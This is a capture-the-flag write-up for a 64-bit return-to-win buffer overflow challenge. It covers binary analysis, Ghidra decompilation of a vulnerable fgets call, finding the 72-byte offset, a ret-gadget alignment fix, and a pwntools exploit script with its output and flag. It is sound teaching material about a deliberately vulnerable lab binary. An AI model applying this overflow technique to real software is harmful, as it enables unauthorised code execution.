---
layout: page
title: "ret2win"
major_type: CTF
parent_group: SecLeaf
sub_module: PWN
summary: "A classic 64-bit return-to-win buffer overflow exploiting fgets()."
---

## Description

This challenge provides an executable binary named `ret2win`. As the name suggests, it is a foundational binary exploitation challenge where we must hijack the execution flow and redirect it to a "win" function that isn't normally called.

## Approach

1. **Initial Analysis:** We start by analyzing the binary's properties using `file` and `checksec` (in GDB).
   ```bash
   ┌──(himanshu@Kaaammui)-[~/Desktop/ctf/SecLeaf/PWN_ret2win]
   └─$ file ret2win  
   ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked... not stripped
   ```
   ```text
   pwndbg> checksec 
   Arch:     amd64
   RELRO:      Partial RELRO
   Stack:      No canary found
   NX:         NX unknown - GNU_STACK missing
   PIE:        No PIE (0x400000)
   ```
   Crucially, there is **No canary** and **No PIE**, meaning buffer overflows are straightforward and function addresses are static.

2. **Reversing with Ghidra:** Decompiling the binary in Ghidra reveals a `vuln()` function with an obvious buffer overflow:
   ```c
   void vuln(void)
   {
     char local_48 [64];
     printf("Tell me your name: ");
     fgets(local_48, 200, stdin); // Reads 200 bytes into a 64 byte buffer!
     printf("Hello, %s\n", local_48);
   }
   ```
   We also find the uncalled `win()` function which prints the flag:
   ```c
   void win(void)
   {
     // ... local variable setup ...
     decode(&local_28, 0x18, 0x55);
     puts("\nAccess Granted!");
     printf("Flag: %s\n", &local_28);
     exit(0);
   }
   ```

3. **Finding the Offset:** We use `gdb` with `pwndbg` to find the exact offset to the instruction pointer (`RIP`).
   - We set a breakpoint right before `vuln()` returns (`0x401285`).
   - We input a cyclic pattern or a long string: `A` * 72 + `B` * 8.
   - Examining the stack pointer (`RSP`), we see it points exactly to our `B`s (`0x4242424242424242`), confirming the offset to overwrite the return address is exactly **72 bytes**.

4. **Building the ROP Chain:** Because this is a 64-bit binary running on modern GLIBC, calling a function like `printf` (which is inside `win`) requires the stack to be 16-byte aligned. If we just return directly to `win()`, it might crash inside `printf`. 
   
   To fix this alignment, we add a simple `ret` gadget to our payload before calling `win()`.
   - `ret` gadget address: `0x401016` (found via `ROPgadget --binary ret2win`)
   - `win()` function address: `0x4011b1`

5. **Exploit Script:** We write a simple python script using `pwntools` to deliver the payload.
   ```python
   from pwn import *

   p = process('./ret2win')

   payload  = b'A' * 72
   payload += p64(0x401016)   # ret gadget for stack alignment
   payload += p64(0x4011b1)   # Address of win()

   p.sendlineafter(b"Tell me your name:", payload)
   p.interactive()
   ```

### Output

```bash
[x] Starting local process './ret2win'
[+] Starting local process './ret2win': pid 38637
[*] Switching to interactive mode
[*] Process './ret2win' stopped with exit code 0 (pid 38637)
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x10@

Access Granted!
Flag: SecLeaf{sm4sh_th3_st4ck}
[*] Got EOF while reading in interactive
```
